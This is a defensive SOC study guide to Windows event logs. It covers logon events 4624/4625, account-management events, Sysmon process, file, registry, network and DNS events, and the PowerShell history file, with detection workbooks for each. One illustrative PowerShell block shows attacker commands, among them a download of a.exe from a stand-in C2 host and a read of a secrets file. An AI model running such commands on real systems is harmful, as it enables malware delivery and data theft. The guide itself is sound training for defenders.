# Windows Event Logs Deep Dive — Authentication, User Management, Sysmon & PowerShell History

## Overview

This document is a deep dive into Windows logging: how logs help a SOC, where Windows stores them and how to read them in Event Viewer, authentication events 4624 and 4625 with workbooks for detecting RDP brute force and analyzing RDP logons, user management events with a workbook for hunting backdoored accounts, process monitoring with 4688 versus Sysmon Event ID 1, additional Sysmon events for file, registry, network, and DNS activity, and PowerShell command logging via the history file.

---

SOC analysts spend most of their time triaging alerts and hunting threats using logs in the SIEM. To tell good from bad, analysts must know the logs well: how they look, how to interpret them, and what malicious activity they indicate. This is a core skill for any SOC analyst or DFIR professional.

---

### Logging Overview

Whenever a program starts, a file is created, or a user logs in, the event is processed by the OS. The OS can then log the event — appending a line to a journal stating the time, action details, and the user behind the action. Every recorded event is a **log**, and proper logging helps a SOC with:

| Activity | How Logs Help |
|---|---|
| **Incident Response** | Logs show when and how an attack occurred |
| **Threat Hunting** | Logs allow searching for signs of malicious activity |
| **Alerting & Triage** | Logs are the building block of any alert or detection rule |

### Anatomy of a Log Entry

Windows has powerful logging capabilities but requires knowledge to read and understand the logs. Logs are stored in binary (`.evtx`) format inside:

```
C:\Windows\System32\winevt\Logs
```

Every EVTX file corresponds to a specific log category. For example:

- **Application Logs** — events logged by user-mode applications (IIS, MS SQL, etc.)
- **Security Logs** — logon attempts, process activity, user management

### Reading Event Logs with Event Viewer

**Event Viewer** is the built-in tool for viewing and managing event logs. Open it via `Win + R` → `eventvwr` → Enter.

| Panel | Purpose |
|---|---|
| **Log Sources** | Each EVTX file maps to one item in the left panel |
| **Log List** | Each row is a single event — sortable by Keywords (success/failure), Date/Time (system time, **not UTC**), Event ID |
| **Log Details** | The actual event content, in plaintext or XML ("Details" tab) |
| **Filters Menu** | "Filter Current Log" and "Find" to narrow results |

---

### Authentication Events — 4624 & 4625

Out of all default Windows logs, the **Security** event log brings the most value. The two most important Security events are:

| Event ID | Purpose | Limitations |
|---|---|---|
| **4624** (Successful Logon) | Detect suspicious RDP/network logins and identify the attack starting point | Logged only on the target machine; very noisy — hundreds of events/minute on loaded servers |
| **4625** (Failed Logon) | Detect brute force, password spraying, or vulnerability scanning | Logged only on the target machine; inconsistent — has caveats that can mislead interpretation |

**Structure of 4624** — core fields to review: Logon ID, Logon Type, username, source IP, and source hostname. (See the Event ID Encyclopedia for the full field/logon-type reference.)

#### Workbook: Detect RDP Brute Force

1. Open Security logs, filter for **4625** (failed logons)
2. Look for **Logon Type 3** (Network) and **10** (RDP)
   - Modern systems (NLA enabled by default) → Logon Type **3**
   - Older/misconfigured systems (NLA disabled) → Logon Type **10**
3. Red flags:
   - Many attempted usernames (`admin`, `helpdesk`, `cctv`) → password spraying
   - Many failures on one account, usually `Administrator` → brute force
   - Workstation Name doesn't match corporate naming (e.g., `kali` instead of `THM-PC-06`)
   - Unexpected source IP (e.g., a printer connecting to a Windows Server)

#### Workbook: Analyse RDP Logons

1. Open Security logs, filter for **4624** (successful logons)
2. Look for **Logon Type 10** (RDP)
3. If NLA is enabled, every RDP logon is preceded by a **4624 Logon Type 3** — check that preceding event for the real Workstation Name
4. Red flags: a preceding brute force, or a suspicious source IP/hostname
5. If malicious, note the **Logon ID** (e.g., `0x5D6AC`) — a unique session identifier used to pivot to related events

---

### User Management Events

> *"Hey Michael, is `svc_sysrestore` your account? Never saw it before."*
> *"No, but it's probably Windows stuff — better not touch it."*

This kind of exchange often precedes a ransomware attack. With knowledge of user-management event IDs, tracing the full history of an account is trivial:

| Event ID | Description | Malicious Usage |
|---|---|---|
| `4720` / `4722` / `4738` | Account created / enabled / changed | Attackers create a backdoor account or re-enable a dormant one to avoid detection |
| `4725` / `4726` | Account disabled / deleted | Advanced actors may disable privileged SOC accounts to slow down response |
| `4723` / `4724` | User changed own password / password was reset (by another user) | With sufficient permissions, attackers reset a password to take over an account |
| `4732` / `4733` | User added to / removed from a security group | Attackers add backdoor accounts to privileged groups like "Administrators" |

**Structure** — all user management events split into three parts:

- **Subject** — the account performing the action (includes a **Logon ID**, correlatable to the preceding 4624)
- **Object** — the target of the action (field name varies: "New Account", "Member", etc.)
- **Details** — exact changes made (e.g., target group for 4732/4733, or new account attributes for 4720)

#### Workbook: Hunt for Backdoored Users

1. Open Security logs, filter for **4720 / 4732**
2. Manually review each event — red flags:
   - No one in IT can confirm the action
   - Change made during non-working hours or weekends
   - Subject username is unknown/unexpected (e.g., `adm.old.2008` creating users)
   - Target username breaks naming convention (e.g., `backup` instead of `thm_svc_backup`)
3. If confirmed malicious: copy the **Logon ID**, find the matching logon event, and continue the investigation using the authentication-event workbooks above

---

### Process Monitoring — 4688 vs. Sysmon Event ID 1

> *"Sarah, have you run any files from the Internet recently?"*
> *"Of course not — why?"*
> *"Well, your IP is trying to brute-force our production servers."*

Knowing **who** was breached isn't enough — process monitoring reveals **how**.

| Event Code | Purpose | Limitations |
|---|---|---|
| **4688** (Security Log: Process Creation) | Logs every new process, including command line and parent process | **Disabled by default**; must be enabled via Group Policy |
| **Sysmon Event ID 1** (Process Creation) | Replaces 4688 with richer fields (process hash, digital signature) | Sysmon is an external Microsoft Sysinternals tool, not installed by default |

Sysmon is the de facto standard for advanced endpoint monitoring. Once installed, its logs appear under:

```
Applications & Services → Microsoft → Windows → Sysmon → Operational
```

**Sysmon Event ID 1 field groups:**

- **Process Info** — PID, image path, command line
- **Parent Info** — parent process context, used to build a process tree / attack chain
- **Binary Info** — process hash, signature, PE metadata
- **User Context** — the user running the process and its **Logon ID** (correlatable with Security logs)

#### Workbook: Analyse Process Launch

1. Open Sysmon logs, filter for **Event ID 1**
2. Review Process/Binary Info — red flags:
   - Image runs from an uncommon directory (`C:\Temp`, `C:\Users\Public`)
   - Suspiciously named process (`aa.exe`, `jqyvpqldou.exe`)
   - Process hash (MD5/SHA256) matches known malware on VirusTotal
3. Review Parent Info — red flags:
   - Parent itself matches the red flags above
   - Unexpected parent (e.g., Notepad spawning CMD commands)
4. If still uncertain, walk up the process tree: find the event where `ProcessId` equals this event's `ParentProcessId`, and repeat steps 2–3
5. Trace the full attack chain by filtering all Security and Sysmon events sharing the same **Logon ID**

---

### Additional Sysmon Event IDs — File, Registry, Network & DNS

Sysmon logs far more than process creation, and its scope is configurable (this deep dive uses the popular **Florian's config**).

| Event ID | Security Log Alternative | Purpose |
|---|---|---|
| **11 / 13** (File Create / Registry Value Set) | 4656 (file) / 4657 (registry) — both disabled by default | Detect files dropped by malware or registry changes (e.g., for persistence) |
| **3 / 22** (Network Connection / DNS Query) | No direct alternative; requires firewall/DNS logging | Detect traffic from untrusted processes or to known-malicious destinations |

Every Sysmon event ID shares common process-related fields, but some fields (Logon ID, parent process info) are only on Event ID 1 — use the shared **ProcessId** field to pivot back to the full process-creation context.

#### Workbook: Analyse Process Activities

1. Copy the **ProcessId** from the Event ID 1 record
2. Search for other Sysmon events sharing that ProcessId
3. Red flags for **network connection** events:
   - Connections to external IPs on port 80, or non-standard ports (e.g., 4444)
   - Connections to known-malicious IPs (check VirusTotal)
   - DNS queries to suspicious domains (`*.top`, `*.click`, `hpdaykfpadvsl.com`)
4. Red flags for **file/registry** events:
   - Files dropped to staging directories (`C:\Temp`, `C:\Users\Public`)
   - Dropped file is a script (`.bat`, `.ps1`) or executable (`.exe`, `.com`)
   - Created files/registry keys used for persistence

---

### PowerShell Command Logging via History File

PowerShell is trusted and built into Windows, but attackers abuse it for malware download, system discovery, data exfiltration, and process injection. Crucially, **Sysmon Event ID 1 only shows that `powershell.exe` launched** — not the commands run inside it:

```
PS C:\> Get-ChildItem
PS C:\> Get-Content secrets.txt
PS C:\> Get-LocalUser; Get-LocalGroup
PS C:\> Invoke-WebRequest http://c2server.thm/a.exe -OutPath C:\Temp\a.exe
```

None of these individual commands create new processes, so they're invisible to process-creation logging alone. PowerShell can run hundreds of commands within a single session without spawning new processes — hence the need for a dedicated monitoring method.

**PowerShell History File** (one of at least five PowerShell monitoring methods — others include AMSI and Transcript Logging):

```
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

- A plain text file, automatically created and updated by PowerShell the moment Enter is pressed
- Useful for tracking malicious actions like discovery commands or malware downloads
- Created **per user** — five active users means up to five separate history files
- Survives reboots unless manually deleted; retains all commands entered over time
- **Does not** log command output, and does not show script content when a script file is invoked (e.g., `powershell .\script.ps1`)

---

### Quick Reference

| Topic | Key Detail |
|---|---|
| Log location | `C:\Windows\System32\winevt\Logs` (binary `.evtx`) |
| Tool | Event Viewer (`eventvwr`) |
| 4624 / 4625 | Successful / Failed logon — check Logon Type 3 (Network) / 10 (RDP) and Logon ID |
| 4720/4722/4738 | Account created / enabled / changed |
| 4725/4726 | Account disabled / deleted |
| 4723/4724 | Password changed (self) / reset (by other) |
| 4732/4733 | Added to / removed from security group |
| 4688 | Process creation (Security log, disabled by default) |
| Sysmon Event ID 1 | Process creation (richer: hash, signature, parent, Logon ID) |
| Sysmon Event ID 3 | Network connection |
| Sysmon Event ID 11 | File create |
| Sysmon Event ID 13 | Registry value set |
| Sysmon Event ID 22 | DNS query |
| Pivot field | **Logon ID** (cross-log correlation) and **ProcessId** (Sysmon event correlation) |
| PowerShell history | `...\PSReadline\ConsoleHost_history.txt` — commands only, no output, per user |

---

## Summary

- Logs underpin **incident response**, **threat hunting**, and **alerting and triage**; Windows stores them in binary `.evtx` files under `C:\Windows\System32\winevt\Logs`, readable in **Event Viewer** (`eventvwr`), which shows system time rather than UTC.
- The **Security** log's most valuable authentication events are **4624** (successful logon — noisy, logged only on the target machine) and **4625** (failed logon — useful for brute force and password spraying, but with caveats); the **RDP brute-force workbook** looks at Logon Type 3 (NLA enabled) or 10 (NLA disabled) for many usernames, many failures on `Administrator`, a mismatched workstation name, or an unexpected source IP, and the **RDP logon workbook** uses the preceding Type 3 event to find the real workstation name and notes the **Logon ID** for pivoting.
- **User management events** (`4720`/`4722`/`4738` created/enabled/changed, `4725`/`4726` disabled/deleted, `4723`/`4724` password change/reset, `4732`/`4733` group membership) split into **Subject, Object,** and **Details**, and the **backdoored users workbook** flags unconfirmed changes, off-hours activity, unknown subjects, and names that break the naming convention.
- **Process monitoring** relies on **4688** (disabled by default, enabled via Group Policy) or **Sysmon Event ID 1** (richer — hash, signature, parent info, Logon ID); the **process launch workbook** reviews uncommon directories, odd names, known-malware hashes, and unexpected parents, then walks up the process tree and traces the attack chain by **Logon ID**, while the **process activities workbook** pivots by **ProcessId** to Sysmon events **3** (network), **22** (DNS), **11** (file create), and **13** (registry set).
- **PowerShell** commands run inside a session create no new processes, so Sysmon Event ID 1 shows only that `powershell.exe` launched; the per-user **history file** (`ConsoleHost_history.txt` under `PSReadline`) captures the commands entered but not their output or the contents of invoked script files.

## Related Documents

- [98. Denial-of-Service (DoS/DDoS) Attacks — Detection & Mitigation](./98-denial-of-service-dos-ddos-attacks-detection-mitigation.md)
- [100. Windows Initial Access — Exposed Services, Phishing & Removable Media](./100-windows-initial-access-exposed-services-phishing-removable-media.md)
- [57. Log Analysis Fundamentals](./57-log-analysis-fundamentals.md)
- [34. PowerShell Fundamentals](./34-powershell-fundamentals.md)
- [58. SIEM Fundamentals](./58-siem-fundamentals.md)
